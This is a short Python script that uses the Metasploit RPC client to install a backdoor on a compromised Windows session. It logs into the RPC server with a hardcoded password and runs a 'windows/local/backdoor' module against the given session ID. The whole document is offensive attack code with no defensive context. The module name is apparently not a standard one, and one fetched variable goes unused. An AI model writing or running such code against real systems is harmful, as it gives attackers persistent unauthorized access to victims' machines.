from metasploit.msfrpc import MsfRpcClient

def install_backdoor(session_id):
    client = MsfRpcClient('password')
    session = client.sessions.session(session_id)
    backdoor_module = client.modules.use('exploit', 'windows/local/backdoor')
    backdoor_module['SESSION'] = session_id
    backdoor_module.execute()